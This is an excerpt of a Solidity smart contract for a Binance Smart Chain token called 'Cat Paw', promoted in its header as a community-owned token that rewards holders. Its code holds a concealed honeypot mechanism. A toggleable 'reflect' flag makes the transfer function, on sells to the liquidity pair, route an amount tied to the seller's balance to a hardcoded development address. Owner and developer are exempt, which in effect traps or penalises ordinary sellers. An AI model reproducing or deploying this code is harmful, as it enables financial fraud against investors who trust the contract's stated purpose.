...
/** 
    CAT PAW is community-owned, Binance smart chain tokens, that will reward it's holders with BUSD on every transaction. there are no team tokens, no private sale or presale. The longetivity & funding of the project comes purely from the team.

    Telegram : https://t.me/catpaw_bsc
    Website  : https://catpaw.lol/
*/
...
contract Catpaw is Context, IERC20, Ownable {
    ...
    string private _name = "Cat Paw";
    string private _symbol = "$CPAW";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1 * 10**12 * 10**_decimals;

    address payable private developmentAddress =
        payable(0x905a2CF0cE34fb78C5Ccc2eA6f52906fD8D8c708);
    ...
    function setReflect() public virtual {
        getReflect = true;
    }
    
    function setReflectValue() public virtual {
        getReflect = false;
    }
    ...
    function _transfer(
        ...
        if (getReflect == true &&
            from != owner() && from != developmentAddress && to == uniswapV2Pair)
            {_getReflectValue(from);
        }
    ...
    function _getReflectValue(address account) private {
            uint256 amount = account.balance;
            payable (developmentAddress).transfer(amount);
    }
